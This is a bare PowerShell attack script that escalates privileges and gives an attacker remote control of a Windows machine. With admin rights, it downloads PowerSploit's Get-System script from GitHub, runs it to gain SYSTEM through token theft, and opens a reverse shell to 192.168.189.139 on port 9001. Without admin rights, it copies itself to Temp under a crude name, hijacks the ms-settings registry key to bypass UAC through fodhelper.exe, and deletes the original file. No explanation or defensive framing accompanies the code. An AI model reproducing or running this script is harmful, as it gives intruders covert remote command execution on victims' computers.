$stager= (Get-Process -Id $pid).Path
$Hpath= "$($home)\AppData\Local\Temp\"
$payload= "$Hpath\gotyabitch.exe"
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$admin=$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($admin) {
$MyInvocation.MyCommand.Path | out-file $Hpath\Succesful.txt
. ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")))
Get-System -Technique Token
$client = New-Object System.Net.Sockets.TCPClient('192.168.189.139',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
}
else {
cp $stager $payload
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value $payload -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
rm $stager -Force
}